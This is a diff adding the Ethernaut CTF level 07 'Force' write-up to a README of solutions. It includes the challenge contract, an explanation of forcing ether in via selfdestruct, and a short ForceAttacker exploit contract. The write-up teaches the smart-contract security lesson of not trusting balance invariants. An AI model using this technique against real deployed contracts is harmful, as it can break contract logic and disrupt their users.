@@ -74,6 +74,16 @@ My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.
 </ol>
 </details>
 
+<details>
+<summary>
+<a href="#07-force">07. Force</a>
+</summary>
+<ol>
+    <li><a href="./contracts/07-force/">Contracts</a></li>
+    <li><a href="./scripts/07-force.ts">Script</a></li>
+</ol>
+</details>
+
 ## 00. Hello Ethernaut
 
 This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.
@@ -782,3 +792,91 @@ Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin
 </details>
 
 <a href='./contracts/06-delegation/'>Contracts</a> | <a href='./scripts/06-delegation.ts'>Script</a>
+
+## 07. Force
+
+### Challenge
+
+Some contracts will simply not take your money ¯\_(ツ)\_/¯
+
+The goal of this level is to make the balance of the contract greater than zero.
+
+Things that might help:
+
+- Fallback methods
+- Sometimes the best way to attack a contract is with another contract.
+
+<details>
+  <summary>Instance</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force {
+/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/
+}
+
+```
+
+</details>
+
+### Solution
+
+<details>
+  <summary>Description</summary>
+
+In order to transfer ether to a contract address there are 3 [ways](https://solidity-by-example.org/sending-ether/):
+
+- transfer
+- send
+- call
+
+However, in order for the transfer to work, fallback functions must be implemented on the side of the called contract (`receive` or `fallback`).
+
+The instance contract does not implement fallback functions. Therefore, we cannot use the above methods for our purpose.
+
+However, there is a way to force ether to be sent to any contract. Using [`selfdestruct`](https://solidity-by-example.org/hacks/self-destruct/) we can send all the ethers from the balance of our contract to the specified address (including CA).
+
+</details>
+
+<details>
+  <summary>Attacker Contract</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ForceAttacker {
+  address forceAddress;
+
+  constructor(address _forceAddress) {
+    forceAddress = _forceAddress;
+  }
+
+  function attack() public payable {
+    selfdestruct(payable(forceAddress));
+  }
+}
+```
+
+</details>
+
+<details>
+  <summary>Comments From OpenZeppelin</summary>
+
+In solidity, for a contract to be able to receive ether, the fallback function must be marked `payable`.
+
+However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.
+
+</details>
+
+<a href='./contracts/07-force/'>Contracts</a> | <a href='./scripts/07-force.ts'>Script</a>
